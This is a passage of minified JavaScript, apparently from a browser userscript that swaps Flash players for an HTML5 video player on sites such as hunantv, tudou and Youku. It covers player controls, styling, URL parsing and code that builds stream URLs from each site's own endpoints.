                                    }.bind(this), 1e3)
                            },
                            onPlayClick: function () {
                                this.DOMs.play.classList.contains("paused") ? (this.video.play(), this.DOMs.play.classList.remove("paused")) : (this.video.pause(), this.DOMs.play.classList.add("paused"))
                            },
                            onSourceClick: function (e) {
                                e.classList.contains("curr") || (this.video.preloadStartTime = this.video.currentTime, this.video.src = this.sourceList[0 | e.getAttribute("sourceIndex")][1], n(e.parentNode.childNodes).forEach(function (t) {
                                    e === t ? t.classList.add("curr") : t.classList.remove("curr")
                                }.bind(this)))
                            },
                            onProgressAnchorWillSet: function (e) {
                                var t = this.video.duration,
                                    n = t * e;
                                this.DOMs.current.innerHTML = r(n),
                                    this.DOMs.duration.innerHTML = r(t),
                                    this.DOMs.progress_anchor.style.width = 100 * e + "%"
                            },
                            onProgressAnchorSet: function (e) {
                                this.video.currentTime = this.video.duration * e
                            },
                            onVolumeAnchorWillSet: function (e) {
                                this.video.volume = e,
                                    this.DOMs.volume_anchor.style.width = 100 * e + "%"
                            },
                            onAllScreenClick: function () {
                                var e = document.documentElement.clientWidth,
                                    t = document.documentElement.clientHeight;
                                this.iframe.style.cssText = ";position:fixed;top:0;left:0;width:" + e + "px;height:" + t + "px;z-index:999999;",
                                    this.allScreenWinResizeFunction = this.allScreenWinResizeFunction ||
                                        function () {
                                            this.iframe.style.width = document.documentElement.clientWidth + "px",
                                                this.iframe.style.height = document.documentElement.clientHeight + "px"
                                        }.bind(this),
                                    window.removeEventListener("resize", this.allScreenWinResizeFunction),
                                    window.addEventListener("resize", this.allScreenWinResizeFunction),
                                    this.DOMs.player.classList.add("allscreen")
                            },
                            onfullScreenClick: function () {
                                ["webkitRequestFullScreen", "mozRequestFullScreen", "requestFullScreen"].forEach(function (e) {
                                    this.DOMs.player[e] && this.DOMs.player[e]()
                                }.bind(this)),
                                    this.onMouseActive()
                            },
                            onNormalScreenClick: function () {
                                window.removeEventListener("resize", this.allScreenWinResizeFunction),
                                    this.iframe.style.cssText = ";width:" + this.size[0] + "px;height:" + this.size[1] + "px;",
                                    ["webkitCancelFullScreen", "mozCancelFullScreen", "cancelFullScreen"].forEach(function (e) {
                                        document[e] && document[e]()
                                    }),
                                    this.DOMs.player.classList.remove("allscreen")
                            },
                            oncommentsBtnClick: function () {
                                this.enableComment = !this.DOMs["comments-btn"].classList.contains("enable"),
                                    this.enableComment ? (setTimeout(function () {
                                        this.DOMs.comments.style.display = "block"
                                    }.bind(this), 80), this.DOMs["comments-btn"].classList.add("enable")) : (this.DOMs.comments.style.display = "none", this.DOMs["comments-btn"].classList.remove("enable"))
                            },
                            onAirplayBtnClick: function () {
                                this.video.webkitShowPlaybackTargetPicker()
                            }
                        }
                    },
                        {
                            "./createElement": 7,
                            "./delegateClickByClassName": 8,
                            "./timeFormat": 14
                        }],
                    5: [function (e, t) {
                        var n = (e("./extend"), e("./createElement"));
                        e("./parseDOMByClassNames"),
                            t.exports = {
                                init: function () {
                                    var e = 0;
                                    this.sourceList.forEach(function (t, i) {
                                        n("li", {
                                            appendTo: this.DOMs.hd,
                                            sourceIndex: i,
                                            className: "source " + (i === e ? "curr" : ""),
                                            innerHTML: t[0]
                                        })
                                    }.bind(this)),
                                        this.DOMs.video.src = this.sourceList[e][1]
                                }
                            }
                    },
                        {
                            "./createElement": 7,
                            "./extend": 9,
                            "./parseDOMByClassNames": 11
                        }],
                    6: [function (e, t) {
                        var n = e("./timeFormat");
                        t.exports = {
                            init: function () {
                                this.video.addEventListener("timeupdate", this.onVideoTimeUpdate.bind(this)),
                                    this.video.addEventListener("play", this.onVideoPlay.bind(this)),
                                    this.video.addEventListener("pause", this.onVideoTimePause.bind(this)),
                                    this.video.addEventListener("loadedmetadata", this.onVideoLoadedMetaData.bind(this)),
                                    this.video.addEventListener("webkitplaybacktargetavailabilitychanged", this.onPlaybackTargetAvailabilityChanged.bind(this)),
                                    setInterval(this.videoBuffered.bind(this), 1e3),
                                    this.DOMs.volume_anchor.style.width = 100 * this.video.volume + "%"
                            },
                            onVideoTimeUpdate: function () {
                                var e = this.video.currentTime,
                                    t = this.video.duration;
                                this.DOMs.current.innerHTML = n(e),
                                    this.DOMs.duration.innerHTML = n(t),
                                this.DOMs.progress_anchor.draging || (this.DOMs.progress_anchor.style.width = 100 * Math.min(Math.max(e / t, 0), 1) + "%")
                            },
                            videoBuffered: function () {
                                var e = this.video.buffered,
                                    t = this.video.currentTime,
                                    n = 0 == e.length ? 0 : e.end(e.length - 1);
                                this.DOMs.buffered_anchor.style.width = 100 * Math.min(Math.max(n / this.video.duration, 0), 1) + "%",
                                    0 == n || t >= n ? this.DOMs.player.classList.add("loading") : this.DOMs.player.classList.remove("loading")
                            },
                            onVideoPlay: function () {
                                this.DOMs.play.classList.remove("paused")
                            },
                            onVideoTimePause: function () {
                                this.DOMs.play.classList.add("paused")
                            },
                            onVideoLoadedMetaData: function () {
                                this.video.preloadStartTime && (this.video.currentTime = this.video.preloadStartTime, delete this.video.preloadStartTime)
                            },
                            onPlaybackTargetAvailabilityChanged: function (e) {
                                var t = "support-airplay";
                                "available" === e.availability ? this.DOMs.player.classList.add(t) : this.DOMs.player.classList.remove(t)
                            }
                        }
                    },
                        {
                            "./timeFormat": 14
                        }],
                    7: [function (e, t) {
                        function n(e, t) {
                            var n = document.createElement(e);
                            if ("function" == typeof t) t.call(n);
                            else for (var i in t) if (t.hasOwnProperty(i)) switch (i) {
                                case "appendTo":
                                    t[i].appendChild(n);
                                    break;
                                case "text":
                                    var o = document.createTextNode(t[i]);
                                    n.innerHTML = "",
                                        n.appendChild(o);
                                    break;
                                case "innerHTML":
                                case "className":
                                case "id":
                                    n[i] = t[i];
                                    break;
                                case "style":
                                    var r = t[i];
                                    for (var a in r) r.hasOwnProperty(a) && (n.style[a] = r[a]);
                                    break;
                                default:
                                    n.setAttribute(i, t[i] + "")
                            }
                            return n
                        }
                        t.exports = n
                    },
                        {}],
                    8: [function (e, t) {
                        function n(e) {
                            return Array.prototype.slice.call(e)
                        }
                        function i(e) {
                            this._eventMap = {},
                                this._rootElement = e,
                                this._isRootElementBindedClick = !1,
                                this._bindClickFunction = function (e) {
                                    !
                                        function t(e, i) {
                                            i && i.nodeName && (i.classList && n(i.classList).forEach(function (t) {
                                                e.trigger(t, i)
                                            }), t(e, i.parentNode))
                                        }(this, e.target)
                                }.bind(this)
                        }
                        var o = e("./extend");
                        o(i.prototype, {
                            on: function (e, t, n) {
                                void 0 === this._eventMap[e] && (this._eventMap[e] = []),
                                    this._eventMap[e].push([t, n]),
                                this._isRootElementBindedClick || (_isRootElementBindedClick = !0, this._rootElement.addEventListener("click", this._bindClickFunction, !1))
                            },
                            off: function (e, t) {
                                if (void 0 != this._eventMap[e]) for (var n = this._eventMap[e].length; n--;) if (this._eventMap[e][n][0] === t) {
                                    this._eventMap[e].splice(n, 1);
                                    break
                                }
                                for (var i in this._eventMap) break;
                                void 0 === i && this._isRootElementBindedClick && (_isRootElementBindedClick = !1, this._rootElement.removeEventListener("click", this._bindClickFunction, !1))
                            },
                            trigger: function (e, t) {
                                t = void 0 === t ? this._rootElement.getElementsByTagNames(e) : [t],
                                    t.forEach(function (t) {
                                        (this._eventMap[e] || []).forEach(function (e) {
                                            e[0].call(e[1], t)
                                        })
                                    }.bind(this))
                            }
                        }),
                            t.exports = function (e) {
                                return new i(e)
                            }
                    },
                        {
                            "./extend": 9
                        }],
                    9: [function (e, t) {
                        function n(e) {
                            for (var t, n = arguments.length, i = 1; n > i;) {
                                t = arguments[i++];
                                for (var o in t) t.hasOwnProperty(o) && (e[o] = t[o])
                            }
                            return e
                        }
                        t.exports = n
                    },
                        {}],
                    10: [function (e) {
                        function t(e, t, n, i) {
                            this.id = e,
                                this.size = t.split("x"),
                                this.sourceList = n || [],
                                this.comments = i,
                                this.init()
                        }
                        e("./component")(t, e("./component_build"), e("./component_event"), e("./component_video"), e("./component_source"), e("./component_comments")),
                            n = t
                    },
                        {
                            "./component": 1,
                            "./component_build": 2,
                            "./component_comments": 3,
                            "./component_event": 4,
                            "./component_source": 5,
                            "./component_video": 6
                        }],
                    11: [function (e, t) {
                        function n(e, t) {
                            var n = {};
                            return t.forEach(function (t) {
                                n[t] = e.getElementsByClassName(t)[0]
                            }),
                                n
                        }
                        t.exports = n
                    },
                        {}],
                    12: [function (e, t) {
                        t.exports = '* { margin:0; padding:0; }body { font-family: "PingHei","Lucida Grande", "Lucida Sans Unicode", "STHeiti", "Helvetica","Arial","Verdana","sans-serif"; font-size:16px;}html, body, .player { height: 100%; }.player:-webkit-full-screen { width: 100%; cursor:url(data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==); }.player:-moz-full-screen { width: 100%; cursor:url(data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==); }.player:full-screen { width: 100%; cursor:url(data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==); }.player { border-radius: 3px; overflow: hidden; position: relative; cursor: default;  -webkit-user-select: none;  -moz-user-select: none; user-select: none;}.video-frame { box-sizing: border-box; padding-bottom: 50px; height: 100%; overflow: hidden; position: relative;}.video-frame .comments{ position: absolute; top:0;left:0; width:100%; height:100%;  -webkit-transform:translateZ(0);  -moz-transform:translateZ(0); transform:translateZ(0);  pointer-events: none;}.player:-webkit-full-screen .video-frame { padding-bottom: 0px; }.player:-moz-full-screen .video-frame { padding-bottom: 0px; }.player:full-screen .video-frame{ padding-bottom: 0px; }.video { width: 100%;  height: 100%; background: #000000;}.controller {  position: absolute; bottom: 0px;  left:0; right:0;  background: #24272A;  height: 50px;}.controller .loading-icon { display: none;  position: absolute; width: 20px;  height: 20px; line-height: 20px;  text-align: center; font-size: 20px;  color: #ffffff; top: -30px; right: 10px;}.player.loading .controller .loading-icon {  display: block;}.player:-webkit-full-screen .controller { -webkit-transform:translateY(50px); -webkit-transition: -webkit-transform 0.3s ease;}.player:-moz-full-screen .controller { -moz-transform:translateY(50px);  -moz-transition: -moz-transform 0.3s ease;}.player:full-screen .controller {  transform:translateY(50px); transition: transform 0.3s ease;}.player.active:-webkit-full-screen { cursor: default;}.player.active:-moz-full-screen {  cursor: default;}.player.active:full-screen { cursor: default;}.player.active:-webkit-full-screen .controller,.player:-webkit-full-screen .controller:hover { -webkit-transform:translateY(0);  cursor: default;}.player.active:-moz-full-screen .controller,.player:-moz-full-screen .controller:hover { -moz-transform:translateY(0); cursor: default;}.player.active:full-screen .controller.player:full-screen .controller:hover {  transform:translateY(0);  cursor: default;}.player.active:-webkit-full-screen .controller .progress .progress_anchor:after,.player:-webkit-full-screen .controller:hover .progress .progress_anchor:after { height:12px;}.player.active:-moz-full-screen .controller .progress .progress_anchor:after,.player:-moz-full-screen .controller:hover .progress .progress_anchor:after { height:12px;}.player.active:full-screen .controller .progress .progress_anchor:after,.player:full-screen .controller:hover .progress .progress_anchor:after { height:12px;}.player:-webkit-full-screen .controller .progress .progress_anchor:after { height:4px;}.player:-moz-full-screen .controller .progress .progress_anchor:after { height:4px;}.player:full-screen .controller .progress .progress_anchor:after {  height:4px;}.controller .progress { position: absolute; top:0px;  left:0; right:0;  border-right: 4px solid #181A1D;  border-left: 8px solid #B3ABAB; height: 4px;  background: #181A1D;  z-index:1;  -webkit-transform: translateZ(0); -moz-transform: translateZ(0);  transform: translateZ(0);}.controller .progress:after { content:""; display: block; position: absolute; top:0px;  left:0; right:0;  bottom:-10px; height: 10px;}.controller .progress .anchor { height: 4px;  background: #B3ABAB;  position: absolute; top:0;left:0;}.controller .progress .anchor:after { content:""; display: block; width: 12px;  background: #f5f5f5;  position: absolute; right:-4px; top: 50%; height: 12px; box-shadow: 0 0 2px rgba(0,0,0, 0.4); border-radius: 12px;  -webkit-transform: translateY(-50%);  -moz-transform: translateY(-50%); transform: translateY(-50%);}.controller .progress .anchor.buffered_anchor {  position: relative; background: rgba(255,255,255,0.1);}.controller .progress .anchor.buffered_anchor:after {  box-shadow: none; height: 4px;  width: 4px; border-radius: 0; background: rgba(255,255,255,0.1);}.controller .right { height: 50px; position: absolute; top:0;  left:10px;  right:10px; pointer-events: none;}.controller .play,.controller .volume,.controller .time,.controller .hd,.controller .airplay,.controller .allscreen,.controller .normalscreen,.controller .comments-btn,.controller .fullscreen { padding-top:4px;  height: 46px; line-height: 50px;  text-align: center; color: #eeeeee; float:left; text-shadow:0 0 2px rgba(0,0,0,0.5);  pointer-events: auto;}.controller .hd,.controller .airplay,.controller .allscreen,.controller .normalscreen,.controller .comments-btn,.controller .fullscreen { float:right;}.controller .play {  width: 36px;  padding-left: 10px; cursor: pointer;}.controller .play:after {  font-family: "FontAwesome"; content: "\\f04c";}.controller .play.paused:after { content: "\\f04b";}.controller .volume {  min-width: 30px;  position: relative; overflow: hidden; -webkit-transition: min-width 0.3s ease 0.5s; -moz-transition: min-width 0.3s ease 0.5s;  transition: min-width 0.3s ease 0.5s;}.controller .volume:hover { min-width: 128px;}.controller .volume:before {  font-family: "FontAwesome"; content: "\\f028";  width: 36px;  display: block;}.controller .volume .progress { width: 70px;  top: 27px;  left: 40px;}.controller .time { font-size: 12px;  font-weight: bold;  padding-left: 10px;}.controller .time .current {  color: #EEEEEE;}.controller .fullscreen,.controller .airplay,.controller .allscreen,.controller .comments-btn,.controller .normalscreen { width: 36px;  cursor: pointer;}.controller .comments-btn {  margin-right: -15px;  display: none;}.player.has-comments .controller .comments-btn { display: block;}.controller .comments-btn:before {  font-family: "FontAwesome"; content: "\\f075";}.controller .comments-btn.enable:before {  color: #DF6558;}.controller .airplay,.controller .normalscreen {  display: none;}.player:-webkit-full-screen .controller .fullscreen,.player:-webkit-full-screen .controller .allscreen { display: none;}.player:-webkit-full-screen .controller .normalscreen,.player.allscreen .controller .normalscreen,.player.support-airplay .controller .airplay { display: block;}.player.allscreen .controller .allscreen {  display: none;}.controller .fullscreen:before { font-family: "FontAwesome"; content: "\\f0b2";}.controller .allscreen:before {  font-family: "FontAwesome"; content: "\\f065";}.controller .normalscreen:before { font-family: "FontAwesome"; content: "\\f066";}.controller .airplay { background: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz48IURPQ1RZUEUgc3ZnIFBVQkxJQyAiLS8vVzNDLy9EVEQgU1ZHIDEuMS8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9HcmFwaGljcy9TVkcvMS4xL0RURC9zdmcxMS5kdGQiPjxzdmcgdmVyc2lvbj0iMS4xIiBpZD0ibWFtYS1haXJwbGF5LWljb24iIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4IiB3aWR0aD0iMjJweCIgaGVpZ2h0PSIxNnB4IiB2aWV3Qm94PSIwIDAgMjIgMTYiIHhtbDpzcGFjZT0icHJlc2VydmUiPjxwb2x5bGluZSBwb2ludHM9IjUsMTIgMSwxMiAxLDEgMjEsMSAyMSwxMiAxNywxMiIgc3R5bGU9ImZpbGw6dHJhbnNwYXJlbnQ7c3Ryb2tlOndoaXRlO3N0cm9rZS13aWR0aDoxIi8+PHBvbHlsaW5lIHBvaW50cz0iNCwxNiAxMSwxMCAxOCwxNiIgc3R5bGU9ImZpbGw6d2hpdGU7c3Ryb2tlOnRyYW5zcGFyZW50O3N0cm9rZS13aWR0aDowIi8+PC9zdmc+DQo=) no-repeat center 20px;  background-size: 22px auto;}.controller .hd { white-space:nowrap; overflow: hidden; margin-right: 10px; text-align: right;}.controller .hd:hover li { max-width: 300px;}.controller .hd li {  display: inline-block;  max-width: 0px; -webkit-transition: max-width 0.8s ease 0.3s; -moz-transition: max-width 0.8s ease 0.3s;  transition: max-width 0.8s ease 0.3s; overflow: hidden; font-size: 14px;  font-weight: bold;  position: relative; cursor: pointer;}.controller .hd li:before {  content: "";  display: inline-block;  width:20px;}.controller .hd li:before { content: "";  display: inline-block;  width:20px;}.controller .hd li.curr { max-width: 300px; cursor: default;  color: #EEEEEE;}.controller .hd li.curr:after { content: "";  display: block; position: absolute; width:4px;  height:4px; border-radius: 50%; background: #ffffff;  left: 12px; top: 23px;  opacity: 0; -webkit-transition: opacity 0.5s ease 0.3s; -moz-transition: opacity 0.5s ease 0.3s;  transition: opacity 0.5s ease 0.3s;}'
                    },
                        {}],
                    13: [function (e, t) {
                        t.exports = '<div class="player">  <div class="video-frame"><video class="video" autoplay="autoplay"></video><canvas class="comments"></canvas></div>  <div class="controller">    <div class="loading-icon fa fa-spin fa-circle-o-notch"></div>   <div class="progress">      <div class="anchor buffered_anchor" style="width:0%"></div>     <div class="anchor progress_anchor" style="width:0%"></div>   </div>    <div class="right">     <div class="fullscreen"></div>      <div class="allscreen"></div>     <div class="normalscreen"></div>      <div class="airplay"></div>     <ul class="hd"></ul>      <div class="comments-btn"></div>     </div>    <div class="left">     <div class="play paused"></div>     <div class="volume">        <div class="progress">          <div class="anchor volume_anchor" style="width:0%"></div>       </div>      </div>      <div class="time">        <span class="current">00:00:00</span> / <span class="duration">00:00:00</span>      </div>     </div> </div></div>'
                    },
                        {}],
                    14: [function (e, t) {
                        function n(e, t) {
                            return (Array(t).join(0) + e).slice(-t)
                        }
                        function i(e) {
                            var t, i = [];
                            return [3600, 60, 1].forEach(function (o) {
                                i.push(n(t = e / o | 0, 2)),
                                    e -= t * o
                            }),
                                i.join(":")
                        }
                        t.exports = i
                    },
                        {}]
                }, {}, [10]),
                t.exports = n
        },
            {}],
        10: [function (e, t) {
            function n(e, t) {
                for (var n = decodeURI(e), i = f[t ? "strict" : "loose"].exec(n), o = {
                    attr: {},
                    param: {},
                    seg: {}
                }, r = 14; r--;) o.attr[p[r]] = i[r] || "";
                return o.param.query = a(o.attr.query),
                    o.param.fragment = a(o.attr.fragment),
                    o.seg.path = o.attr.path.replace(/^\/+|\/+$/g, "").split("/"),
                    o.seg.fragment = o.attr.fragment.replace(/^\/+|\/+$/g, "").split("/"),
                    o.attr.base = o.attr.host ? (o.attr.protocol ? o.attr.protocol + "://" + o.attr.host : o.attr.host) + (o.attr.port ? ":" + o.attr.port : "") : "",
                    o
            }
            function i(e, t) {
                if (0 === e[t].length) return e[t] = {};
                var n = {};
                for (var i in e[t]) n[i] = e[t][i];
                return e[t] = n,
                    n
            }
            function o(e, t, n, r) {
                var a = e.shift();
                if (a) {
                    var s = t[n] = t[n] || [];
                    "]" == a ? d(s) ? "" !== r && s.push(r) : "object" == typeof s ? s[u(s).length] = r : s = t[n] = [t[n], r] : ~a.indexOf("]") ? (a = a.substr(0, a.length - 1), !v.test(a) && d(s) && (s = i(t, n)), o(e, s, a, r)) : (!v.test(a) && d(s) && (s = i(t, n)), o(e, s, a, r))
                } else d(t[n]) ? t[n].push(r) : t[n] = "object" == typeof t[n] ? r : "undefined" == typeof t[n] ? r : [t[n], r]
            }
            function r(e, t, n) {
                if (~t.indexOf("]")) {
                    var i = t.split("[");
                    o(i, e, "base", n)
                } else {
                    if (!v.test(t) && d(e.base)) {
                        var r = {};
                        for (var a in e.base) r[a] = e.base[a];
                        e.base = r
                    }
                    "" !== t && s(e.base, t, n)
                }
                return e
            }
            function a(e) {
                return c(String(e).split(/&|;/), function (e, t) {
                    try {
                        t = decodeURIComponent(t.replace(/\+/g, " "))
                    } catch (n) {}
                    var i = t.indexOf("="),
                        o = l(t),
                        a = t.substr(0, o || i),
                        s = t.substr(o || i, t.length);
                    return s = s.substr(s.indexOf("=") + 1, s.length),
                    "" === a && (a = t, s = ""),
                        r(e, a, s)
                }, {
                    base: {}
                }).base
            }
            function s(e, t, n) {
                var i = e[t];
                "undefined" == typeof i ? e[t] = n : d(i) ? i.push(n) : e[t] = [i, n]
            }
            function l(e) {
                for (var t, n, i = e.length, o = 0; i > o; ++o) if (n = e[o], "]" == n && (t = !1), "[" == n && (t = !0), "=" == n && !t) return o
            }
            function c(e, t) {
                for (var n = 0, i = e.length >> 0, o = arguments[2]; i > n;) n in e && (o = t.call(void 0, o, e[n], n, e)),
                    ++n;
                return o
            }
            function d(e) {
                return "[object Array]" === Object.prototype.toString.call(e)
            }
            function u(e) {
                var t = [];
                for (var n in e) e.hasOwnProperty(n) && t.push(n);
                return t
            }
            function h(e, t) {
                return 1 === arguments.length && e === !0 && (t = !0, e = void 0),
                    t = t || !1,
                    e = e || window.location.toString(),
                {
                    data: n(e, t),
                    attr: function (e) {
                        return e = m[e] || e,
                            "undefined" != typeof e ? this.data.attr[e] : this.data.attr
                    },
                    param: function (e) {
                        return "undefined" != typeof e ? this.data.param.query[e] : this.data.param.query
                    },
                    fparam: function (e) {
                        return "undefined" != typeof e ? this.data.param.fragment[e] : this.data.param.fragment
                    },
                    segment: function (e) {
                        return "undefined" == typeof e ? this.data.seg.path : (e = 0 > e ? this.data.seg.path.length + e : e - 1, this.data.seg.path[e])
                    },
                    fsegment: function (e) {
                        return "undefined" == typeof e ? this.data.seg.fragment : (e = 0 > e ? this.data.seg.fragment.length + e : e - 1, this.data.seg.fragment[e])
                    }
                }
            }
            var p = ["source", "protocol", "authority", "userInfo", "user", "password", "host", "port", "relative", "path", "directory", "file", "query", "fragment"],
                m = {
                    anchor: "fragment"
                },
                f = {
                    strict: /^(?:([^:\/?#]+):)?(?:\/\/((?:(([^:@]*):?([^:@]*))?@)?([^:\/?#]*)(?::(\d*))?))?((((?:[^?#\/]*\/)*)([^?#]*))(?:\?([^#]*))?(?:#(.*))?)/,
                    loose: /^(?:(?![^:@]+:[^:@\/]*@)([^:\/?#.]+):)?(?:\/\/)?((?:(([^:@]*):?([^:@]*))?@)?([^:\/?#]*)(?::(\d*))?)(((\/(?:[^?#](?![^?#\/]*\.[^?#\/.]+(?:[?#]|$)))*\/?)?([^?#\/]*))(?:\?([^#]*))?(?:#(.*))?)/
                },
                v = /^[0-9]+$/;
            t.exports = h
        },
            {}],
        11: [function (e, t) {
            function n(e) {
                var t = [];
                for (var n in e) e.hasOwnProperty(n) && t.push([n, e[n]].join("="));
                return t.join("&")
            }
            t.exports = n
        },
            {}],
        12: [function (e, t, n) {
            var i = e("./canPlayM3U8"),
                o = e("./ajax");
            n.match = function (e) {
                return /www\.hunantv\.com/.test(e.attr("host"))
            },
                n.getVideos = function (e, t) {
                    if (i) {
                        var n = function (e) {
                                var t = e.split("?")[1],
                                    n = new Array;
                                n = t.split("&");
                                var i = {};
                                for (key in n) param = n[key],
                                    item = new Array,
                                    item = n[key].split("="),
                                "" != item[0] && (i[item[0]] = item[1]);
                                return i
                            },
                            r = "&fmt=6&pno=7&m3u8=1",
                            a = document.getElementsByName("FlashVars")[0].getAttribute("value"),
                            s = a.split("&file=")[1],
                            l = s.split("%26fmt")[0];
                        l += r,
                            l = decodeURIComponent(l),
                            params = n(l);
                        var c = new Array;
                        c = ["570", "1056", "1615"],
                            urls = new Array,
                            params.limitrate = c[0],
                            text = "\u6807\u6e05",
                            o({
                                url: "http://pcvcr.cdn.imgo.tv/ncrs/vod.do",
                                jsonp: !0,
                                param: params,
                                callback: function (e) {
                                    "ok" == e.status && urls.push([text, e.info]),
                                        params.limitrate = c[1],
                                        text = "\u9ad8\u6e05",
                                        o({
                                            url: "http://pcvcr.cdn.imgo.tv/ncrs/vod.do",
                                            jsonp: !0,
                                            param: params,
                                            callback: function (e) {
                                                "ok" == e.status && urls.push([text, e.info]),
                                                    params.limitrate = c[2],
                                                    text = "\u8d85\u6e05",
                                                    o({
                                                        url: "http://pcvcr.cdn.imgo.tv/ncrs/vod.do",
                                                        jsonp: !0,
                                                        param: params,
                                                        callback: function (e) {
                                                            return "ok" == e.status && urls.push([text, e.info]),
                                                                t(urls)
                                                        }
                                                    })
                                            }
                                        })
                                }
                            })
                    } else console.log("\u8bf7\u4f7f\u7528Safari\u89c2\u770b\u672c\u89c6\u9891"),
                        setTimeout(function () {
                            return t()
                        }, 2e3)
                }
        },
            {
                "./ajax": 2,
                "./canPlayM3U8": 3
            }],
        13: [function (e, t, n) {
            var i = e("./canPlayM3U8"),
                o = e("./ajax"),
                r = e("./seeker_youku");
            n.match = function (e) {
                var t = window.iid || window.pageConfig && window.pageConfig.iid || window.itemData && window.itemData.iid,
                    n = window.itemData && window.itemData.vcode;
                return /tudou\.com/.test(e.attr("host")) && (n || t)
            },
                n.getVideos = function (e, t) {
                    var n = window.itemData && window.itemData.vcode;
                    if (n) return r.parseYoukuCode(n, t);
                    var a = window.iid || window.pageConfig && window.pageConfig.iid || window.itemData && window.itemData.iid,
                        s = function (e) {
                            var t, n = [
                                ["\u539f\u753b", "http://vr.tudou.com/v2proxy/v2.m3u8?it=" + a + "&st=5"],
                                ["\u8d85\u6e05", "http://vr.tudou.com/v2proxy/v2.m3u8?it=" + a + "&st=4"],
                                ["\u9ad8\u6e05", "http://vr.tudou.com/v2proxy/v2.m3u8?it=" + a + "&st=3"],
                                ["\u6807\u6e05", "http://vr.tudou.com/v2proxy/v2.m3u8?it=" + a + "&st=2"]
                            ];
                            window.itemData && window.itemData.segs && (n = [], t = JSON.parse(window.itemData.segs), t[5] && n.push(["\u539f\u753b", "http://vr.tudou.com/v2proxy/v2.m3u8?it=" + a + "&st=5"]), t[4] && n.push(["\u8d85\u6e05", "http://vr.tudou.com/v2proxy/v2.m3u8?it=" + a + "&st=4"]), t[3] && n.push(["\u9ad8\u6e05", "http://vr.tudou.com/v2proxy/v2.m3u8?it=" + a + "&st=3"]), t[2] && n.push(["\u6807\u6e05", "http://vr.tudou.com/v2proxy/v2.m3u8?it=" + a + "&st=2"])),
                                console.log("\u89e3\u6790tudou\u89c6\u9891\u5730\u5740\u6210\u529f " + n.map(function (e) {
                                        return "<a href=" + e[1] + ">" + e[0] + "</a>"
                                    }).join(" ")),
                                e(n)
                        },
                        l = function (e) {
                            o({
                                url: "http://vr.tudou.com/v2proxy/v2.js",
                                param: {
                                    it: a,
                                    st: "52%2C53%2C54"
                                },
                                jsonp: "jsonp",
                                callback: function (t) {
                                    if (-1 === t || -1 == t.code) return console.log("\u89e3\u6790tudou\u89c6\u9891\u5730\u5740\u5931\u8d25");
                                    for (var n = [], i = 0, o = t.urls.length; o > i; i++) n.push([i, t.urls[i]]);
                                    return console.log("\u89e3\u6790tudou\u89c6\u9891\u5730\u5740\u6210\u529f " + n.map(function (e) {
                                            return "<a href=" + e[1] + ">" + e[0] + "</a>"
                                        }).join(" ")),
                                        e(n)
                                }
                            })
                        };
                    i ? s(t) : l(t)
                }
        },
            {
                "./ajax": 2,
                "./canPlayM3U8": 3,
                "./seeker_youku": 14
            }],
        14: [function (e, t, n) {
            function i(e) {
                var t = [];
                for (var n in e) t.push(n + "=" + e[n]);
                return t.join("&")
            }
            function o(e) {
                if (!e) return "";
                e = e.toString();
                var t, n, i, o, r, a, s, l = new Array(-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);
                for (a = e.length, r = 0, s = ""; a > r;) {
                    do t = l[255 & e.charCodeAt(r++)];
                    while (a > r && -1 == t);
                    if (-1 == t) break;
                    do n = l[255 & e.charCodeAt(r++)];
                    while (a > r && -1 == n);
                    if (-1 == n) break;
                    s += String.fromCharCode(t << 2 | (48 & n) >> 4);
                    do {
                        if (i = 255 & e.charCodeAt(r++), 61 == i) return s;
                        i = l[i]
                    } while (a > r && -1 == i);
                    if (-1 == i) break;
                    s += String.fromCharCode((15 & n) << 4 | (60 & i) >> 2);
                    do {
                        if (o = 255 & e.charCodeAt(r++), 61 == o) return s;
                        o = l[o]
                    } while (a > r && -1 == o);
                    if (-1 == o) break;
                    s += String.fromCharCode((3 & i) << 6 | o)
                }
                return s
            }
            function r(e) {
                if (!e) return "";
                e = e.toString();
                var t, n, i, o, r, a, s = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
                for (i = e.length, n = 0, t = ""; i > n;) {
                    if (o = 255 & e.charCodeAt(n++), n == i) {
                        t += s.charAt(o >> 2),
                            t += s.charAt((3 & o) << 4),
                            t += "==";
                        break
                    }
                    if (r = e.charCodeAt(n++), n == i) {
                        t += s.charAt(o >> 2),
                            t += s.charAt((3 & o) << 4 | (240 & r) >> 4),
                            t += s.charAt((15 & r) << 2),
                            t += "=";
                        break
                    }
                    a = e.charCodeAt(n++),
                        t += s.charAt(o >> 2),
                        t += s.charAt((3 & o) << 4 | (240 & r) >> 4),
                        t += s.charAt((15 & r) << 2 | (192 & a) >> 6),
                        t += s.charAt(63 & a)
                }
                return t
            }
            function a(e, t) {
                for (var n, i = [], o = 0, r = "", a = 0; 256 > a; a++) i[a] = a;
